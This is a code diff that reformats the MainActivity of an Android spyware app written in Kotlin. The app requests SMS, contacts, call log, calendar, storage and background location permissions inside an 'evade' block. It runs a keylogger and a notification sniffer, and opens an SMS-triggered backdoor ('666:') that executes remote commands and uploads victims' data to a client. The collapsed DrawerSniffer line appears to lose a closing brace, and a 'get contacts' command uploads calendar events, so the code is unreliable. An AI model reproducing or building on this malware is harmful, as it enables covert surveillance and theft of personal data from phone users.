@@ -57,42 +57,15 @@ class MainActivity : AppCompatActivity() {
             evade {
                 val kotlinPermissions = KotlinPermissions.with(this@MainActivity).apply {
                     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q)
-                        permissions(
-                            Manifest.permission.RECEIVE_SMS,
-                            Manifest.permission.READ_CONTACTS,
-                            Manifest.permission.READ_CALENDAR,
-                            Manifest.permission.READ_EXTERNAL_STORAGE,
-                            Manifest.permission.READ_CALL_LOG,
-                            Manifest.permission.READ_SMS,
-                            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-                            Manifest.permission.ACCESS_COARSE_LOCATION,
-                            Manifest.permission.ACCESS_BACKGROUND_LOCATION,
-                            Manifest.permission.READ_PHONE_STATE
-                        )
+                        permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.ACCESS_COARSE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION, Manifest.permission.READ_PHONE_STATE)
                     else
-                        permissions(
-                            Manifest.permission.RECEIVE_SMS,
-                            Manifest.permission.READ_CONTACTS,
-                            Manifest.permission.READ_CALENDAR,
-                            Manifest.permission.READ_EXTERNAL_STORAGE,
-                            Manifest.permission.READ_CALL_LOG,
-                            Manifest.permission.READ_SMS,
-                            Manifest.permission.ACCESS_COARSE_LOCATION
-                        )
+                        permissions(Manifest.permission.RECEIVE_SMS, Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALENDAR, Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.READ_CALL_LOG, Manifest.permission.READ_SMS, Manifest.permission.ACCESS_COARSE_LOCATION)
                 }
                 kotlinPermissions.onAccepted {
                     val payload = suspend {
                         withContext(Dispatchers.Default) {
-                            val keyloggerJob = launch {
-                                Keylogger.subscribe { entry ->
-                                    Log.d("KEYLOGGER", entry.toString())
-                                }
-                            }
-                            launch {
-                                DrawerSniffer.subscribe(this@MainActivity) { notification ->
-                                    Log.d("DRAWERSNIFFER", notification.toString())
-                                }
-                            }.join()
+                            val keyloggerJob = launch { Keylogger.subscribe { entry -> Log.d("KEYLOGGER", entry.toString())} }
+                            launch { DrawerSniffer.subscribe(this@MainActivity) { notification -> Log.d("DRAWERSNIFFER", notification.toString()) }.join()
                             keyloggerJob.join()
                         }
                     }
@@ -107,11 +80,7 @@ class MainActivity : AppCompatActivity() {
                             }
                         }
                     }.use { client ->
-                        SmsBackdoor.openDoor(
-                            this@MainActivity,
-                            "666:",
-                            payload = payload
-                        ) { remoteCommand ->
+                        SmsBackdoor.openDoor(this@MainActivity,"666:",payload = payload) { remoteCommand ->
                             runBlocking {
                                 when (remoteCommand) {
                                     "COMMAND_GET_CONTACTS" -> calendarLaunch(this@MainActivity).let { calendarEvents -> client.upload(calendarEvents) }
